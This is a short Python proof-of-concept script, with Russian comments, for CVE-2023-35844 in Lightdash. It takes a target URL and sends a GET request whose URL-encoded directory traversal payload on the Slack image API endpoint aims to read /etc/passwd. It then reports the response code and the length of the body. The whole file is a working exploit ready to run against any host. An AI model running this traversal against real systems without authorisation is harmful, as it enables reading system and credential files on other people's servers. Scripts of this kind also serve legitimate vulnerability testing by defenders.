#!/usr/bin/env python3
import sys
import requests
from urllib.parse import urljoin

# Пример payload из advisory: slack-image%2F..%2F..%2F..%2Fetc%2Fpasswd
# (URL-encoded "../" для обхода директорий) [page:2]
PAYLOAD = "slack-image%2F..%2F..%2F..%2Fetc%2Fpasswd"

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} https://target.tld/")
        sys.exit(1)

    base = sys.argv[1].rstrip("/") + "/"
    path = f"api/v1/slack/image/{PAYLOAD}"
    url = urljoin(base, path)

    print("[*] CVE-2023-35844 (Lightdash) PoC-эмуляция")
    print(f"[*] Формируем потенциально вредоносный запрос к: {url}")

    try:
        r = requests.get(url, timeout=8)
        print(f"[*] Ответ: HTTP {r.status_code}, длина тела: {len(r.content)} байт")
        if r.status_code == 200:
            print("[+] Возможная уязвимость: endpoint отдал успешный ответ на traversal-подобный запрос.")
        else:
            print("[-] Не подтверждено по коду ответа (это не исключает уязвимость; зависит от конфигурации/патча).")
    except requests.RequestException as e:
        print(f"[!] Ошибка запроса: {e}")

if __name__ == "__main__":
    main()
